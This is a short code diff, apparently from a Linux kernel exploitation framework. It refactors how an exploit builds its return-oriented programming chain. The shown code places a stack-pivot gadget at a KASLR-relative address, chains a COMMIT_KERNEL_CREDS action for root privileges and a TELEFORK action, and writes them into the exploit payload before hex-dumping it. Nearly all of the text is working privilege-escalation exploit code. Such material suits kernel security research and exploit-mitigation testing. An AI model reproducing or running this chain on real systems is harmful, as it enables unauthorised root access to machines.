@@ -96,14 +96,12 @@ int main() {
     // 0xffffffff81113160: pop r14 ; pop r13 ; pop r12 ; pop rbp ; pop rbx ; ret ; (1 found)
     payload.Set(stack_pivot->GetDestinationOffset(), kaslr_base + 0x113160);
 
-    auto rop_commit_creds = target.GetRopChain(RopActionId::COMMIT_KERNEL_CREDS, kaslr_base);
+    RopChain rop(kaslr_base);
+    target.AddRopAction(rop, RopActionId::COMMIT_KERNEL_CREDS);
     // TODO: Default values are currently broken, remove argument when fixed
-    auto rop_telefork = target.GetRopChain(RopActionId::TELEFORK, kaslr_base, {5000});
+    target.AddRopAction(rop, RopActionId::TELEFORK, {5000});
 
-    auto rop_idx = 0x38;
-    payload.Set(rop_idx, rop_commit_creds);
-    rop_idx += rop_commit_creds.size();
-    payload.Set(rop_idx, rop_telefork);
+    payload.Set(0x38, rop.GetData());
 
     printf("[+] Payload:\n");
     HexDump::Print(payload.GetData());
